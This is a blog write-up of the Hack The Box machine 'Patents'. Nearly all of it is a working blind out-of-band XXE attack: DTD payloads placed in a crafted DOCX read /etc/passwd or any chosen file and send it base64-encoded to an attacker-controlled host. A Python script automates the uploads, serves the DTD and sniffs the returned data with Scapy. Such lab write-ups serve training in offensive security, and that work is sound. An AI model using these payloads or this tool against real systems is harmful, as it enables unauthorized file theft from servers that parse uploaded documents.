---
layout: post
title: "Playing with HTB{ Patents }"
date: 2020-05-16 19:00:00 +0300
author: snovvcrash
categories: /pentest
tags: [notes, hackthebox, machine, linux, docx, xxe, python, scapy]
comments: true
published: true
---

Automate crafting malicious DOCX for blind XXE-OOB with external DTD using Python and Scapy.

<!--cut-->

<p align="right">
	<a href="https://www.hackthebox.eu/home/machines/profile/224"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
	<span class="score-hard">7.8/10</span>
</p>

![banner.png](/assets/images/htb/machines/patents/banner.png)
{:.center-image}

![info.png](/assets/images/htb/machines/patents/info.png)
{:.center-image}

* TOC
{:toc}

# XXE

## Manual exploitation

### Way 1. General entity payload

`customXml/item1.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://10.10.15.131:1337/ext.dtd">
%xxe;
%ext;
]>
<foo>&exfil;</foo>
```

External file `ext.dtd` (hosted on local machine):

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'http://10.10.15.131:1337/?x=%file;'>">
```

### Way 2. Parameter entity payload

`customXml/item1.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://10.10.15.131:1337/ext.dtd">
%xxe;
]>
<foo></foo>
```

External file `ext.dtd` (hosted on local machine):

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.15.131:1337/?x=%file;'>">
%ext;
%exfil;
```

### Malicious DOC/DOCX

Get `docx` sample and unpack it:

```
root@kali:$ curl https://file-examples.com/wp-content/uploads/2017/02/file-sample_100kB.docx > sample.docx
root@kali:$ unzip sample.docx
```

Create `customXml/` dir with a payload and pack it back:

```
root@kali:$ mkdir customXml
root@kali:$ vi customXml/item1.xml
...
root@kali:$ rm malicious.docx; zip -r malicious.docx '[Content_Types].xml' customXml/ docProps/ _rels/ word/
```

![manual-exploit-out-1.png](/assets/images/htb/machines/patents/manual-exploit-out-1.png)
{:.center-image}

![manual-exploit-out-2.png](/assets/images/htb/machines/patents/manual-exploit-out-2.png)
{:.center-image}

## Automate with Scapy

Scripting all the stuff to run simple HTTP server and Scapy HTTP sniffer in separate threads:

```python
#!/usr/bin/env python3

import re
import cmd
import socket
import fcntl
import struct
from base64 import b64decode
from threading import Thread
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

# http.server.BaseHTTPRequestHandler VS http.server.SimpleHTTPRequestHandler
# socketserver.TCPServer VS http.server.HTTPServer

import requests
from scapy.all import *

M = '\033[%s;35m'  # MAGENTA
S = '\033[0m'      # RESET

URL = 'http://patents.htb/convert.php'


class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
	"""
	https://stackoverflow.com/a/3389505/6253579
	https://stackoverflow.com/a/10651257/6253579
	"""

	def log_request(self, code='-', size='-'):
		return


class HTTPServerInThread(Thread):

	def __init__(self, address='0.0.0.0', port=1337):
		super().__init__()
		self.address = address
		self.port = port
		self.httpd = TCPServer((address, port), SilentHTTPRequestHandler)

	def run(self):
		print(f'[*] Serving HTTP on {self.address} port {self.port} (http://{self.address}:{self.port}/) ...')
		self.httpd.serve_forever()


class HTTPSniffer(Thread):

	def __init__(self, iface='tun0'):
		super().__init__()
		self.iface = iface
		self.re = re.compile(r'/\?x=(\S+)')

	def run(self):
		# Wireshark filter: "http.request.method == GET && tcp.port == 1337"
		sniff(iface=self.iface, filter='tcp dst port 1337', prn=self.process_http)

	def process_http(self, pkt):
		try:
			req_text = pkt[Raw].load.decode()
			if '/?x=' in req_text:
				contents_b64 = self.re.search(req_text).group(1)
				print(b64decode(contents_b64).decode())
		except IndexError:
			pass


class Default(dict):

	def __missing__(self, key):
		return '{' + key + '}'


class Terminal(cmd.Cmd):

	prompt = f'{M%0}XXE{S}> '

	def __init__(self, proxies=None):
		super().__init__()

		self.headers = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate'
		}

		self.ext_dtd = """\
			<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={filename}">
			<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'http://{ip}:1337/?x=%file;'>">
			%ext;
			%exfil;
		""".replace('\t', '').format_map(Default({"ip": self._get_ip()}))

		if proxies:
			self.proxies = {'http': proxies}
		else:
			self.proxies = {}

	def do_file(self, filename):
		with open('/root/htb/boxes/patents/xxe/ext.dtd', 'w') as f:
			f.write(self.ext_dtd.format(filename=filename))

		files = {
			'userfile': ('test.docx', open('/root/htb/boxes/patents/xxe/docx/malicious.docx', 'rb'), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'),
			'submit': (None, 'Generate pdf')
		}

		resp = requests.post(URL, files=files)

	def do_EOF(self, args):
		print()
		return True

	def emptyline(self):
		pass

	def _get_ip(self, iface='tun0'):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(
			s.fileno(),
			0x8915,  # SIOCGIFADDR
			struct.pack('256s', iface[:15].encode())
		)[20:24])


if __name__ == '__main__':
	server = HTTPServerInThread()
	server.daemon = True
	server.start()

	sniffer = HTTPSniffer()
	sniffer.daemon = True
	sniffer.start()

	Terminal().cmdloop()
```

![xxe-py-out.png](/assets/images/htb/machines/patents/xxe-py-out.png)
{:.center-image}

# Refs

* [What is a blind XXE attack? Tutorial & Examples / Web Security Academy](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
* [Out-of-band XML External Entity (OOB-XXE) / Acunetix](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)
* [bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
* [XXE Attacks— Part 1: XML Basics - klose - Medium](https://medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26)
* [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
* [Sample .doc and .docx download / File Examples Download](https://file-examples.com/index.php/sample-documents-download/sample-doc-download/)
* [c# - VSTO Word 2013 add in - Add Custom XML to document xml without it being visible on the page - Stack Overflow](https://stackoverflow.com/a/38797399/6253579)
* [python - How to quiet SimpleHTTPServer? - Stack Overflow](https://stackoverflow.com/a/10651257/6253579)
* [python - Leaving values blank if not passed in str.format - Stack Overflow](https://stackoverflow.com/a/19800610/6253579)
